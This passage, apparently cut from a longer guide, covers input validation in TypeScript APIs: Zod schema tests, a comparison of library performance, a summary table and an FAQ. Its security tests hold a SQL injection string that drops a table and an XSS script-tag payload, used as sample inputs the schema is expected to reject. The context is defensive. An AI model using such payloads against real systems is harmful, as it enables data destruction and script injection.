    expect(result.success).toBe(false);
  });

  it('should reject negative age', () => {
    const input = { name: 'Taro', email: 'taro@example.com', age: -1 };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(false);
  });

  it('should reject invalid role', () => {
    const input = { name: 'Taro', email: 'taro@example.com', role: 'superadmin' };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(false);
  });

  // --- Boundary value tests ---
  it('should accept name with exactly 100 characters', () => {
    const input = { name: 'a'.repeat(100), email: 'taro@example.com' };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(true);
  });

  it('should reject name with 101 characters', () => {
    const input = { name: 'a'.repeat(101), email: 'taro@example.com' };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(false);
  });

  it('should accept exactly 10 tags', () => {
    const input = {
      name: 'Taro',
      email: 'taro@example.com',
      tags: Array.from({ length: 10 }, (_, i) => `tag${i}`),
    };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(true);
  });

  it('should reject 11 tags', () => {
    const input = {
      name: 'Taro',
      email: 'taro@example.com',
      tags: Array.from({ length: 11 }, (_, i) => `tag${i}`),
    };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(false);
  });

  // --- Security tests ---
  it('should handle SQL injection attempt in email', () => {
    const input = { name: 'Taro', email: "'; DROP TABLE users; --" };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(false); // Does not match email format
  });

  it('should handle XSS attempt in name', () => {
    const input = {
      name: '<script>alert("xss")</script>',
      email: 'taro@example.com',
    };
    // The name field has no HTML escape transform, so validation itself
    // may pass, but output-time escaping is what matters
    const result = CreateUserSchema.safeParse(input);
    // Regardless of result, output-time escaping is critical
  });
});
```

---

## 15. Performance Considerations

### 15.1 Validation Performance Comparison

| Library | 1000 validations (simple schema) | 1000 validations (complex schema) | Notes |
|---------|----------------------------------|-----------------------------------|-------|
| Zod | ~2–5ms | ~10–30ms | Compiled schemas are fast |
| Joi | ~5–15ms | ~30–80ms | Rich features add overhead |
| class-validator | ~10–20ms | ~40–100ms | Uses reflection |
| JSON Schema (ajv) | ~0.5–2ms | ~3–10ms | Fastest with pre-compilation |

* The numbers above indicate general tendencies and vary significantly depending on schema structure and data size.

### 15.2 Performance Optimization Tips

```typescript
// 1. Cache schemas (do not generate them every time)
// BAD: Generate schema per request
app.post('/api/users', (req, res) => {
  const schema = z.object({ /* ... */ }); // Generated every time (wasteful)
  schema.parse(req.body);
});

// GOOD: Define once at module level
const UserSchema = z.object({ /* ... */ }); // Generated only once
app.post('/api/users', (req, res) => {
  UserSchema.parse(req.body); // Reused
});

// 2. Avoid unnecessary transforms
// If post-validation transforms are heavy,
// separate validation and transformation

// 3. Optimize element validation for large arrays
// When applying complex validation to an array of 1000 elements,
// first limit the array size and then run validation
const LargeArraySchema = z.array(
  z.object({ /* ... */ })
).max(100); // Limit size first
```

---

## Summary

| Concept | Key Points |
|---------|-----------|
| Trust Boundary | Never trust external input. Perform validation at the trust boundary |
| Zod | TypeScript-first. Automatic type inference via z.infer is its greatest strength. Use safeParse for safe validation |
| Joi | Long-established, mature library. Powerful conditional branching via when |
| class-validator | Decorator-based. NestJS default. Used in combination with class-transformer |
| Sanitization | Apply at both input and output time. Context-appropriate escaping is critical |
| SQL Injection Defense | Parameterized queries are the absolute rule. String concatenation is strictly forbidden |
| XSS Defense | Set Content-Type, CSP headers, and HTML escape at output time |
| Mass Assignment Defense | Accept only allowed fields with whitelist + strict() |
| ReDoS Defense | Input length limit + safe regex patterns |
| Error Responses | Return all errors together in RFC 7807 format with 422 |
| Environment Variables | Run schema validation at startup to prevent starting with invalid configuration |
| Testing | Test validation from 4 perspectives: normal cases, error cases, boundary values, and security |

---

## FAQ

### Q1: At which layer should validation be performed?

The principle is to perform validation "at the point where data crosses a trust boundary." For web APIs, it is common practice to perform validation at the controller layer (the entry point of the request handler). Business rule validation is performed in the service layer, and DB constraints (UNIQUE, NOT NULL, etc.) function as the last line of defense in the data access layer. Validating at multiple layers means that even if there is a bug in one layer, the other layers can provide defense.

### Q2: Which should I use, parse or safeParse?

In principle, you should use `safeParse`. `parse` throws an exception when validation fails, requiring try-catch and making the control flow complex. On the other hand, `safeParse` returns a Result type (success/error), which can be safely handled with TypeScript type guards. However, there is no problem using `parse` in scenarios where the process should terminate on failure, such as environment variable validation.

### Q3: Can I change the validation library mid-project?

It is possible, but the cost is high. By separating validation schemas as "middleware" from routing and standardizing the validation result interface, changing the internal library becomes relatively straightforward. As with the `validateInput` function in this guide, a design where application code wraps library-specific APIs in a thin wrapper and does not directly depend on the library is desirable.

### Q4: What is the relationship between JSON Schema and validation libraries?

JSON Schema is a "standard specification for schema definition" and is also used as part of the OpenAPI (Swagger) specification for API documentation. JSON Schema validators like ajv are fast but inferior to Zod and others in TypeScript type inference and the flexibility of custom validation. A strategy combining both: "define schemas with Zod and use zod-to-json-schema to auto-generate JSON Schema for use in OpenAPI documentation."

### Q5: Is a validation library still needed for GraphQL?

GraphQL automatically performs type-level validation through schema definitions. However, detailed field-level validation such as "maximum string length," "regex patterns," and "business rules" cannot be expressed with GraphQL schemas alone. Therefore, it is recommended to add validation using Zod or similar libraries within resolvers.

---

## Further Reading

- API Testing
- [Authentication](./00-authentication-patterns.md)
- [Rate Limiting](./01-rate-limiting.md)

---

## References

1. Zod. "TypeScript-first schema validation with static type inference." github.com/colinhacks/zod, 2024.
2. OWASP. "Input Validation Cheat Sheet." cheatsheetseries.owasp.org, 2024.
3. OWASP. "API Security Top 10 - 2023." owasp.org/API-Security, 2023.
4. OWASP. "SQL Injection Prevention Cheat Sheet." cheatsheetseries.owasp.org, 2024.
5. Joi. "The most powerful schema description language and data validator for JavaScript." joi.dev, 2024.
6. class-validator. "Decorator-based property validation for classes." github.com/typestack/class-validator, 2024.
7. RFC 7807. "Problem Details for HTTP APIs." tools.ietf.org/html/rfc7807, 2016.
8. DOMPurify. "DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer." github.com/cure53/DOMPurify, 2024.
